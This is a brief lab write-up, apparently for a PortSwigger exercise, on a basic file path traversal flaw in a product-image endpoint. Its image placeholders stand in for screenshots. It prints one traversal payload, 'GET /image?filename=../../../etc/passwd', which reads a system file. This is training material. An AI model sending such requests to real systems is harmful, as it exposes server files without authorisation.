# File Path Traversal — Basic Scenario

This exercise covers a path traversal vulnerability found in how the application displays product images.

**Goal:** Retrieve the contents of `/etc/passwd`.

---

**Reference:**
- https://portswigger.net/web-security/file-path-traversal

pic 1

---

Images are fetched using a GET request that takes a `filename` parameter:

pic 2

To pull `/etc/passwd`:

```
GET /image?filename=../../../etc/passwd 
```

pic 3
